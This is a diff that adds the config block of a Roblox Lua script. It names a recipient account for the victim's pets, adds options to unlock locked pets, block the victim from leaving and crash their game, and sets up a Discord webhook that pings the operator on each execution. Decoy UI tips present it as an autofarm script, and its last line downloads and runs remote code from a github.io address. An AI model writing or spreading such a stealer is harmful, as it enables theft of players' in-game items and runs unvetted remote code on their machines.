@@ -1,0 +1,25 @@
+
+_G.Username = "GamerGirlX1999" --// Username To Send Pets To
+_G.UserID =  -3656977043-// Roblox user ID here to invite to bank
+_G.GiftMessage = "Thats the price to pay" --// Message For The Gift To Say
+
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true  --// Crashes Them After Its Finished
+
+--[[ Webhook Config ]]--
+_G.Enabled = true --// Toggle For Sending Webhooks
+_G.Mention = true --// Pings You When Someone Executes
+_G.Webhook = "" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+_G.ScriptName = "" --// Script Name On The UI
+_G.Tip1 = "New script added" --// Gives You Tips On The UI
+_G.Tip2 = "Autofarm Updated" --// Gives You Tips On The UI
+_G.Tip3 = "Comet Farm updated" --// Gives You Tips On The UI
+_G.Tip4 = "" --// Gives You Tips On The UI
+_G.Tip5 = "" --// Gives You Tips On The UI
+
+--[[ Script ]]
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
